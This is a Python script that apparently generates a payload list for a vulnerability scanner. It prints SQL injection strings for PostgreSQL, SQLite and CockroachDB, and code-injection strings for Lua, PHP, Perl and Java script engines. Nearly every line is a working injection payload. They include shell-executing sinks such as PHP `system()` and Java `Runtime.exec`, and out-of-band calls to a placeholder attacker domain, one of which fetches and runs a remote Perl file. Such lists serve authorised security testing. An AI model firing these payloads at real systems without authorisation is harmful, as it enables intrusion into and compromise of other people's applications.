#!/usr/bin/env python3
"""
Generate missing SQLi and Code Injection payloads.
Every payload produces a detectable signal: error, math (1337), timing (>4.5s), or OOB ({domain} callback).
One payload per line, grouped by ##Header##.
"""

DOMAIN = "{domain}"

payloads = []

# ---------------------------------------------------------------------------
# SQLi -- PostgreSQL Error-Based
# ---------------------------------------------------------------------------
payloads.append("##PostgreSQL Error-Based##")
payloads.append("' AND 1=CAST(version() AS int)--")
payloads.append("' AND 1=CAST(current_database() AS int)--")
payloads.append("' AND 1=CAST(current_user AS int)--")
payloads.append("') AND 1=CAST(version() AS int)--")

# ---------------------------------------------------------------------------
# SQLi -- SQLite Error-Based
# ---------------------------------------------------------------------------
payloads.append("##SQLite Error-Based##")
payloads.append("' AND 1=invalidfunc()--")
payloads.append("' AND 1=CAST('abc' AS INTEGER)--")
payloads.append("' AND typeof(invalid_col)--")

# ---------------------------------------------------------------------------
# SQLi -- CockroachDB Timing
# ---------------------------------------------------------------------------
payloads.append("##CockroachDB Time-Based##")
payloads.append("' AND pg_sleep(5) IS NOT NULL--")
payloads.append("1;SELECT pg_sleep(5)--")

# ---------------------------------------------------------------------------
# Code Injection -- Lua
# ---------------------------------------------------------------------------
payloads.append("##Lua Code Injection##")
# Math (1337)
payloads.append('loadstring("return 7*191")()')
payloads.append("assert(loadstring('return 7*191'))()")
# Error
payloads.append('loadstring("error(\'1337\')")()')
payloads.append("error('1337')")
# Timing
payloads.append('local s=os.clock();while os.clock()-s<5 do end')
payloads.append("require('socket').sleep(5)")
# OOB (language built-ins, no shell)
payloads.append(f'require("socket").connect("{DOMAIN}", 80)')
payloads.append(f'require("socket.http").request("http://{DOMAIN}/lua")')

# ---------------------------------------------------------------------------
# Code Injection -- PHP Missing Sinks
# ---------------------------------------------------------------------------
payloads.append("##PHP Code Injection##")
# Math
payloads.append("assert(7*191)")
# Error + exec
payloads.append("assert(system('echo 1337'))")
# PHP <7 preg_replace /e
payloads.append("preg_replace('/.*/e','system(\"echo 1337\")','')")
# create_function (deprecated but present in PHP <8)
payloads.append("create_function('','return 7*191;')()")
# Timing (built-in, no shell)
payloads.append("assert(sleep(5)||1)")
# OOB (built-in)
payloads.append(f"assert(file_get_contents('http://{DOMAIN}/php'))")

# ---------------------------------------------------------------------------
# Code Injection -- Perl Missing Sinks
# ---------------------------------------------------------------------------
payloads.append("##Perl Code Injection##")
# Math
payloads.append("eval('7*191')")
# OOB (built-in LWP / socket, no shell)
payloads.append(f"do 'http://{DOMAIN}/shell.pl'")
payloads.append(f"use IO::Socket::INET;IO::Socket::INET->new(PeerAddr=>\"{DOMAIN}\",PeerPort=>80)")
# Timing (built-in)
payloads.append("eval('select(undef,undef,undef,5)')")

# ---------------------------------------------------------------------------
# Code Injection -- Java ScriptEngine (Nashorn / GraalJS)
# ---------------------------------------------------------------------------
payloads.append("##Java ScriptEngine Injection##")
# Math (1337)
payloads.append("var x=7*191")
# Timing
payloads.append("java.lang.Runtime.getRuntime().exec('sleep 5')")
payloads.append("java.lang.Thread.sleep(5000)")
# OOB (built-in java.net, no shell)
payloads.append(f'new java.net.URL("http://{DOMAIN}/nashorn").openStream()')
payloads.append(f'var u=new java.net.URL("http://{DOMAIN}/graaljs");var c=u.openConnection();c.getInputStream()')

# ---------------------------------------------------------------------------
# Print
# ---------------------------------------------------------------------------
for line in payloads:
    print(line)
